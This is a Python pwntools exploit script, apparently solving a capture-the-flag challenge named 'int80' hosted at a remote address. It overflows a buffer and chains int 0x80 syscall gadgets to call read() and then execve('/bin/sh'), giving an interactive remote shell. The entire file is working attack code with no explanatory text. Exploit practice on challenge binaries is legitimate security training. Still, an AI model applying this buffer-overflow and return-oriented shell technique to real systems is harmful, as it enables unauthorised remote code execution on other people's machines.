def slog(title,context): log.success(f'{title} : {hex(context)}')
from pwn import *
context.log_level = 'debug'
p = remote("sung.pw", 13334)
e = ELF("./int80")

int80 = 0x0804848E
pop3ret = 0x08048497

payload = b''
payload += b'A' * 0x20 + b'B' * 0x4

# read(0, e.bss(), 0x300)
payload += p32(pop3ret)
payload += p32(3)
payload += p32(0)
payload += p32(e.bss() + 0x100)
payload += p32(0x300)
payload += p32(int80)

# execve(binsh, NULL, NULL)
payload += p32(pop3ret)
payload += p32(11)
payload += p32(e.bss() + 0x100)
payload += p32(0)
payload += p32(0)
payload += p32(int80)

p.send(payload)

p.send(b'/bin/sh\x00')

p.interactive()